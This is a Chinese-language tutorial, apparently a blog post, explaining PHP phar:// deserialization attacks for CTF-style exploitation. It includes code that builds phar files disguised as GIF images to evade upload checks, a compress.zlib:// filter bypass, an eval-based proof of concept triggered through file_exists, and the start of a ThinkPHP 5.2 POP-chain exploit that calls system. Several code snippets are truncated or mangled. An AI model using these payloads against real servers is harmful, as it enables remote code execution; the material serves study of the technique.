## 前言
继上篇对thinkphp5版本反序列化pop链详细分析后，对tp的反序列化漏洞有了初步了解，但是其实无论挖掘的pop链有多么的完美，最终还是避免不了要有关键的触发点，否则将一无是处，比如常见的就是反序列化函数
unserialize()
，绝大多数都是靠unserialize函数，反序列化对象触发漏洞。但是在tp框架或者其他框架以及后期开发越来越安全的情况下我们很难再找到这样的触发点。最近也是在各种ctf中碰到的关于tp的pop链构造触发反序列化漏洞，但都是通过
phar 构造反序列化。
关于这个方法在去年 BlackHat 大会上的 Sam Thomas 分享了 [File Operation Induced Unserialization
via the “phar://” Stream Wrapper](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf) ，该研究员指出 **该方法在 文件系统函数 （ file_get_contents 、 unlink
等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作** 。
## 原理分析
#### 0x01.phar文件分析
在了解原理之前，我们查询了一下官方手册，手册里针对 phar:// 这个伪协议是这样介绍的。
>
> Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。
> Phar有点像PHP应用程序的拇指驱动器。（译文）
简单理解 phar:// 就是一个类似 file://
的流包装器，它的作用可以使得多个文件归档到统一文件，并且在不经过解压的情况下被php所访问，并且执行。
下面看一下phar文件的结构：  
大体来说 Phar 结构由4部分组成
**1.stub ：phar文件标识**
可以理解为一个标志，格式为`xxx`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被
phar 这函数识别利用。
**2\. a manifest describing the contents**  
phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。
**3\. the file contents**  
被压缩文件的内容。
**4\. [optional] a signature for verifying Phar integrity (phar file format
only)**  
签名，放在文件末尾，格式如下：
#### 0x02 demo测试
根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。
注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。
    startBuffering();
        $phar->setStub(""); //设置stub
        $o = new TestObject();
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
可以看到meta-data是以序列化的形式存储的：
#### 0x03将phar伪造成其他格式的文件
前面我们刚刚说了，我们可以 phar
文件必须以`__HALT_COMPILER();?>`来结尾，那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。因此假设这里我们构造一个带有图片文件头部的
phar 文件。
    startBuffering();
        $phar->setStub("GIF89a".""); //设置stub
        $o = new TestObject();
        $o->data='hello L1n!';
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
那么我们看看这个假装自己是图片的phar文件最后的效果。
    data;
        }
        }
    ?>
成功反序列化识别文件内容，采用这种方法可以绕过很大一部分上传检测。
#### 0x04触发反序列化的文件操作函数
有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
为什么 Phar 会反序列化处理文件并且在文件操作中能够成功反序列化呢？这里需要通过php底层代码才能知道，关于这个问题ZSX师傅的[Phar与Stream
Wrapper造成PHP RCE的深入挖掘](https://xz.aliyun.com/t/2958#toc-0)已经详细分析了。  
这里通过一个demo论证一下上述结论。仍然以上面的phar文件为例
    data;
                echo 'Destruct called';
            }
        }
        $filename = 'phar://phar.phar/test.txt';
        file_get_contents($filename); 
    ?>
这里可以看到已经反序列化成功触发`__destruct`方法并且读取了文件内容。  
其他函数也是可以的，就不一一试了，  
如果题目限制了，`phar://`不能出现在头几个字符。可以用`Bzip / Gzip`协议绕过。
    $filename = 'compress.zlib://phar://phar.phar/test.txt';
虽然会警告但仍会执行，它同样适用于`compress.bzip2://`。  
当文件系统函数的参数可控时，我们可以在不调用`unserialize()`的情况下进行反序列化操作，极大的拓展了反序列化攻击面。
## 举例分析
**利用条件**  
任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。
1.phar文件要能够上传到服务器端。  
2.如`file_exists()，fopen()，file_get_contents()，file()`等文件操作的函数要有可用的魔术方法作为"跳板"。  
3.文件操作函数的参数可控，且:`:、/、phar`等特殊字符没有被过滤。
这里先用smi1e师傅的demo做个例子。  
[php反序列化攻击拓展](https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/)  
**例一、**  
upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif
un.php存在`file_exists()`，并且存在`__destruct()`
    ';
    class AnyClass{
        var $output = 'echo "ok";';
        function __destruct()
        {   
            eval($this -> output);
        }
    }
        if(file_exists($filename)){
            $a = new AnyClass();
        }
        else{
            echo 'file is not exists';
        }
    ?>
该demo环境存在两个点，第一存在文件上传，只能上传gif图，第二存在魔术方法`__destruct()`以及文件操作函数`file_exists()`，而且在AnyClass类中调用了eval，以此用来命令执行。  
我们知道以上条件正好满足利用条件。  
根据un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码
poc.php
     stopBuffering();
    $phar -> setStub('GIF89a'.'');
    $phar -> addFromString('test.txt','test');
    $object = new AnyClass();
    $object -> output= 'phpinfo();';
    $phar -> setMetadata($object);
    $phar -> stopBuffering();
生成phar文件后，改后缀为gif
`payload:un.php?filename=phar://phar.gif/test`
**例二**  
现在来看一下tp5.2版本的pop链如何利用Phar反序列化，上篇讲到了tp的pop链构造和利用原理，最后通过我们自己设的反序列化函数触发点。这里放上利用链，不再分析。
    think\process\pipes\Windows->__destruct()
     think\process\pipes\Windows->removeFiles()
     think\model\concern\Conversion->__toString()
     think\model\concern\Conversion->toJson()
     think\model\concern\Conversion->toArray()
     think\model\concern\Attribute->getAttr()
     think\model\concern\Attribute->getValue()
smi1e师傅的poc：
    files = array($files);
            }
        }
    }
    namespace think\model\concern {
        trait Conversion
        {
        }
        trait Attribute
        {
            private $data;
            private $withAttr = array('Smi1e' => 'system');
            public function get($system)
            {